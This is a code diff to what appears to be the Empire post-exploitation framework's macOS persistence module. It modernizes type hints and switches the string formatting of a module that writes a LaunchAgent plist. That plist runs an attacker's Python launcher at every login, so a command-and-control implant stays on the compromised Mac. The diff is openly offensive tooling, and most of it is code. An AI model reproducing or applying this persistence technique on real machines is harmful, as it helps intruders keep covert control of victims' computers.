@@ -1,5 +1,4 @@
-from typing import Dict, Optional, Tuple
-
+from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.string_util import removeprefix, removesuffix
 
@@ -7,12 +6,12 @@ from empire.server.utils.string_util import removeprefix, removesuffix
 class Module:
     @staticmethod
     def generate(
-        main_menu,
+        main_menu: MainMenu,
         module: EmpireModule,
-        params: Dict,
+        params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
-    ) -> Tuple[Optional[str], Optional[str]]:
+    ) -> tuple[str | None, str | None]:
         plist_name = params["PLISTName"]
         listener_name = params["Listener"]
         user_agent = params["UserAgent"]
@@ -27,26 +26,23 @@ class Module:
         launcher = removesuffix(launcher, " | python3 &")
         launcher = launcher.strip('"')
 
-        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
+        plistSettings = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>Label</key>
-<string>{}</string>
+<string>{plist_name}</string>
 <key>ProgramArguments</key>
 <array>
 <string>python</string>
 <string>-c</string>
-<string>{}</string>
+<string>{launcher}</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 </dict>
 </plist>
-""".format(
-            plist_name,
-            launcher,
-        )
+"""
 
         script = f"""
 import subprocess
